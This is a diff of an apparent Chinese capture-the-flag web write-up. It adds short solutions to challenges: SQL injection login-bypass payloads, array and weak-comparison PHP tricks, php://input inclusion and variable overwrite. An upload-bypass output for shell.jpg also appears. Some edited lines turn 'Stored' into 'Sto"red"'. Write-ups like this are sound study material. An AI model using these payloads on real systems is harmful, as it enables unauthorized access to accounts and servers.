@@ -169,7 +169,7 @@
 
 <h2 id="11download">11.Download~!</h2>
 
-<p>&lt;font color=red&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;</p>
+<font color="red">貌似是题目坏掉了，题目无法访问</font>
 
 <h2 id="12cookie">12.COOKIE</h2>
 
@@ -208,7 +208,7 @@
 
 <h2 id="18php是世界上最好的语言">18.PHP是世界上最好的语言</h2>
 
-<p>&lt;font color=red&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;</p>
+<font color="red">貌似是题目坏掉了，题目无法访问</font>
 
 <h2 id="19伪装者">19.伪装者</h2>
 
@@ -218,7 +218,7 @@
 
 <h2 id="20header">20.Header</h2>
 
-<p>&lt;font color=red&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;</p>
+<font color="red"> 貌似是题目坏掉了，题目无法访问</font>
 
 <h2 id="21上传绕过">21.上传绕过</h2>
 
@@ -250,7 +250,7 @@ Content-Type: text/php
     [0] =&gt; .jpg
     [1] =&gt; jpg
 )
-Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;br /&gt;Sto"red" in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
   ["dirname"]=&gt;
   string(9) "./uploads"
   ["basename"]=&gt;
@@ -272,7 +272,7 @@ Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;
     [0] =&gt; .jpg
     [1] =&gt; jpg
 )
-Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;br /&gt;Sto"red" in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
   ["dirname"]=&gt;
   string(9) "./uploads"
   ["basename"]=&gt;
@@ -286,6 +286,74 @@ Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;
 </code></pre></div></div>
 
 <p>通过回显内容的对比可以看到，这里截断就是要截断<code class="highlighter-rouge">test.phpshell.jpg</code>从而绕过后台的验证。</p>
+
+<h2 id="22sql注入1">22.SQL注入1</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=admin')#&amp;pass=1
+</code></pre></div></div>
+
+<h2 id="23pass-check">23.pass check</h2>
+
+<p>POST: <code class="highlighter-rouge">pass[]=1</code></p>
+
+<h2 id="24起名字真难">24.起名字真难</h2>
+
+<p>PHP 中弱类型比较</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xccccccccc
+</code></pre></div></div>
+
+<h2 id="25密码重置">25.密码重置</h2>
+
+<font color="red">貌似是题目坏掉了，题目无法访问</font>
+
+<h2 id="26php-反序列化暂时无法做">26.php 反序列化(暂时无法做)</h2>
+
+<p>暂时无法做</p>
+
+<h2 id="27sql-injection">27.SQL Injection</h2>
+
+<p>发现sql查选语句使用了分号，对于此种类型的sql注入就必须要闭合其中的分号。由于使用了htmlentities()函数，所以无法使用分号了。此时就可以使用反斜杠来通过转义的方式来吞掉一个分号。注入的payload为：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password= or 1%23
+</code></pre></div></div>
+<p>那么最后的查询语句就会变为：<code class="highlighter-rouge">SELECT * FROM users WHERE name='admin\'AND pass=' or 1#'</code>这样就得到了flag了。 遇到了带有引号的sql查选，就是要逃脱单引号，要么就是生成一个单引号，要么就是省略掉一个单引号。在本题中由于没有屏蔽反斜线，就可以使用反斜线来去掉一个单引号。</p>
+
+<h2 id="28综合题">28.综合题</h2>
+
+<p>JSFuck<br />
+tip: history of bash<br />
+bash 的历史记录存放在 .bash_histroy 这个隐藏文件里，访问  <code class="highlighter-rouge">http://.../.bash_histroy</code>。再下载对应文件即可。</p>
+
+<h2 id="29system暂时无法做">29.system（暂时无法做）</h2>
+
+<p>暂时无法做</p>
+
+<h2 id="30sql注入2">30.SQL注入2</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=' union select md5(1)#&amp;pass=1
+</code></pre></div></div>
+
+<h2 id="31综合题2">31.综合题2</h2>
+
+<h2 id="32密码重置2">32.密码重置2</h2>
+
+<font color="red">貌似是题目坏掉了，题目无法访问</font>
+
+<h2 id="33file_get_contents">33.file_get_contents</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /web23/?file=php://input HTTP/1.1
+
+meizijiu
+</code></pre></div></div>
+
+<h2 id="34变量覆盖">34.变量覆盖</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /web24/?name=meizijiu233 HTTP/1.1
+</code></pre></div></div>
+
+<h2 id="35hateit">35.HateIT</h2>
+
+<h2 id="36anonymous">36.Anonymous</h2>
 
 
     </article>
